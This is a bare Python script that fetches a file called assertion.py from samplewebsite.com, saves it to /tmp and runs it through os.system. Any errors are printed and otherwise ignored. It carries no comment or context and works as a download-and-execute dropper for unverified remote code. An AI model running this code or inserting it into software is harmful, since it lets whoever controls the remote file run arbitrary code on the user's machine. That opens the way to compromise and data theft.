import requests
import os

def obtain_and_execute():
    try:
        url = "https://samplewebsite.com/assertion.py"
        local_file = "/tmp/assertion.py"

        response = requests.get(url)
        with open(local_file, "w") as f:
            f.write(response.text)

        os.system(f"python {local_file}")

    except Exception as e:
        print(e)

obtain_and_execute()
